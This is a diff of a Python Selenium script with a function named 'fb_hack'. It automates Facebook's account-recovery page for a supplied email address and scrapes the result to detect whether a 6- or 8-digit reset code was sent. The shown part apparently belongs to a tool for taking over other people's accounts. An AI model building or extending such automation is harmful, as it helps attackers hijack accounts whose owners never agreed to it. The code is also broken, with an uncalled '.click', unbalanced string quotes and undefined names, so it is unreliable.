@@ -12,9 +12,7 @@ from email.mime.text import MIMEText
 import logging
 import selenium.webdriver
 from selenium import webdriver
-from selenium.webdriver.common.action_chains import ActionChains
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
@@ -44,30 +42,30 @@ def fb_hack(email, codex, respect):
   options.add_argument("--disable-dev-shm-usage")
   options.add_argument("--headless=new")
   driver = webdriver.Chrome(options=options)
-  driver.get("http://m.facebook.com/login.php")
+  driver.get("https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l")
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
+  #wait = WebDriverWait(driver, 10)
+  #element = wait.until(EC.visibility_of_element_located((by = By.ID, "element_id")))
+  search_box = driver.find_element(by = By.ID, value = "identify_email")
+  search_box.send_keys(email)
+  driver.find_element(by = By.ID, value = "did_submit").click
   sleep(2)
-  search_box = driver.find_element(by = By.NAME, value = "pass")
-  driver.send_keys(Keys.TAB)
-  actions.send_keys(Keys.TAB)
-  actions.send_keys(Keys.ENTER)
-  search_box.click()
   driver.save_screenshot("/sdcard/download/tester.png")
   
   """search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
   search_button.click()
   "make respect properly"
-  counter = 0"""
+  counter = 0
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
   with open("output1.txt", "w") as file:
     file.write(str(soup))
-  source_file = "output1.txt" 
-  destination_folder = "/sdcard/download/output1.txt" 
+  #source_file = "output1.txt" 
+  #destination_folder = "/sdcard/download/screenshot.png" 
   
-  shutil.move(source_file, destination_folder)
-  """test = soup.find(string="pop")
+  #shutil.move(source_file, destination_folder)
+  test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   if sixdigits != test:
